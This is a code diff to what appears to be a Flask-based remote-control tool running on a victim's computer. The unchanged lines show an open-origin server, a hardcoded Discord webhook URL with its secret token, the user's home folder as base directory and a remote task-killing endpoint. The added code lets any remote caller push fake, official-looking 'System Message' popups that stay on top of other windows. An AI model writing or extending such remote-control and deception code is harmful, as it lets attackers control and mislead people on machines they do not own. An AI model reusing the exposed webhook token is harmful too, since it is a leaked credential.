@@ -12,6 +12,70 @@ CORS(app, resources={r"/*": {"origins": "*", "methods": ["GET", "POST", "OPTIONS
 WEBHOOK_URL = "https://discord.com/api/webhooks/1314775003081871430/X3xBhkQ0K6ISb-mGpE4R-1yjfKlq-UEsdejT4CeF3RjBjcz5zGe-bGqq_wt_qtkWdj5x"
 BASE_DIRECTORY = os.path.expanduser("~")
 
+import tkinter as tk
+from tkinter import ttk
+from threading import Thread
+
+def show_message(message):
+    def display():
+        root = tk.Tk()
+        root.title("System Message")
+        root.geometry("400x200")
+        root.resizable(False, False)
+
+        # Set the window to always appear on top
+        root.attributes("-topmost", True)
+
+        # Use a modern Windows-like background color
+        root.configure(bg="#f0f0f0")
+
+        # Add a frame for padding and alignment
+        frame = ttk.Frame(root, padding=20)
+        frame.pack(expand=True, fill="both")
+
+        # Add an icon to make it more official-looking (optional, requires a .ico file)
+        try:
+            root.iconbitmap("info.ico")  # Replace "info.ico" with the path to your .ico file
+        except:
+            pass  # Ignore if icon file is not available
+
+        # Add a label to display the message
+        label = ttk.Label(
+            frame,
+            text=message,
+            wraplength=350,
+            justify="center",
+            font=("Segoe UI", 12)
+        )
+        label.pack(pady=(10, 20))
+
+        # Add a close button
+        button = ttk.Button(frame, text="OK", command=root.destroy)
+        button.pack(pady=10)
+
+        # Center the button
+        button.focus_set()  # Set focus to the button for keyboard interaction (Enter key)
+        root.bind("<Return>", lambda e: root.destroy())  # Allow pressing Enter to close
+
+        # Start the main loop
+        root.mainloop()
+
+    # Run the tkinter GUI in a separate thread
+    thread = Thread(target=display)
+    thread.start()
+
+@app.route('/display_message', methods=['POST'])
+def display_message():
+    try:
+        message = request.json.get("message")
+        if not message:
+            return jsonify({"error": "No message provided"}), 400
+
+        show_message(message)
+        return jsonify({"message": "Message displayed successfully"}), 200
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
 @app.route('/kill_task', methods=['POST'])
 def kill_task():
     try:
